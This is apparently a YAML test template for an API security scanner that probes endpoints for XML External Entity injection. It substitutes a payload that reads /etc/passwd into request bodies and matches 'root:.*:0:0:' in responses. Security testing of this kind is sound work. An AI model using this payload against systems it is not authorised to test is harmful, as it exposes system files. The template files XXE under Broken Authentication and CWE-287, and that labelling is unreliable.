id: SIMPLE_XXE_INJECTION
info:
  name: "Basic XML External Entity (XXE) Vulnerability test in API Endpoints"
  description: >
    "This test assesses the ability of the application to safely handle XML input, 
    specifically focusing on identifying and preventing unauthorized access to external 
    entities or system files through XML parsing."
  details: >
    "This test aims to identify vulnerabilities where XML input could be exploited 
    to access or expose sensitive data via external entity references."
  impact: >
    "Successful exploitation of XXE vulnerabilities could lead to sensitive data disclosure, 
    server-side request forgery, or internal system probing, posing significant security risks."
  category:
    name: NO_AUTH
    shortName: Broken Authentication
    displayName: Broken User Authentication (BUA)
  subCategory: SIMPLE_XXE_INJECTION
  severity: HIGH
  tags:
    - Business logic
    - OWASP top 10
    - HackerOne top 10
  references:
    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/"
    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa2-broken-authentication.md"
    - "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
  cwe:
    - CWE-287
  cve:
    - CVE-2020-24008
    - CVE-2021-45901

api_selection_filters:
  response_code:
    gte: 200
    lt: 300
  response_payload:
    length:
      gt: 0
    not_contains:
      - Error
      - Internal Server 
      - Failed
      - Unauthorized
      - access denied
      - Forbidden
      - Method Not allowed
      - Gateway timeout
      - request timeout
      - server error
      - server busy
      - authentication error
      - authorization error
      - validation error
      - Permission Denied
      - invalid token
      - token expired
      - session expired
      - session timeout
      - unexpected error
      - unable to process request
      - bad request
      - service unavailable
      - account is locked
      - account is blocked
      - multiple failed attempts
  method:
    contains_either:
      - POST
      - PUT
      - PATCH
  request_payload:
    for_one:
      key:
        regex: .*
        extract: changed_body_key
      value:
        extract: changed_body_value
wordLists:
  payloads:
    - "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"
execute:
  type: single
  requests:
    - req:
        - modify_body_param: 
            changed_body_key:  ${payloads}
validate:
  response_payload:
    length:
      gt: 0
    not_contains:
      - Error
      - Internal Server 
      - Failed
      - Unauthorized
      - access denied
      - Forbidden
      - Method Not allowed
      - Gateway timeout
      - request timeout
      - server error
      - server busy
      - authentication error
      - authorization error
      - validation error
      - Permission Denied
      - invalid token
      - token expired
      - session expired
      - session timeout
      - unexpected error
      - unable to process request
      - bad request
      - service unavailable
      - account is locked
      - account is blocked
      - multiple failed attempts
    regex: "root:.*:0:0:"